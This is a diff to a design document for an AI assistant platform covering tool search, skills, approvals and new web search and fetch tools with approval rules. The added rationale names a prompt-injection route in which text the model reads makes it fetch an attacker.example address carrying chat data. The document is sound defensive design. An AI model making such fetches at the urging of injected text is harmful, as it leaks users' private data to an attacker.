@@ -82,6 +82,10 @@ One retrieval service for project files, past chats, memory items and add-on dat
 - **Tool search.** Only a few always-on tools plus a `search_tools` tool are sent; other MCP and Connect tools are loaded when found. Small models get 1–5 tool schemas per step.
 - **Skills** move to the open Agent Skills format (SKILL.md, progressive disclosure: name and description always, body and files when used). The unused agent-manifest skills in `skills/agents/assistant.default/agent.yaml` are folded in or removed.
 - **Approvals** stay as they are (ADR-0013 §9, tiers, held calls, one-time tokens); tools without a read-only hint count as writes.
+- **Web search and fetch (#369).** `web.search` and `web.fetch` are built-in, `read` tier, and their results reach the model only as untrusted blocks.
+  - `web.fetch` runs without asking only for an address with known provenance in the chat: one the person typed, or one a `web.search` in the same chat returned.
+  - Any other address asks once per chat and site, and a job's such call is held.
+  - Reason: a GET carries data out in its address. Text the model read could make it fetch `https://attacker.example/?d=<something from the chat>`, for the same reason ADR-0013 §9.1 gives `read` add-on handlers no `http()`.
 
 ### 8. Runs, tracing and evals
 
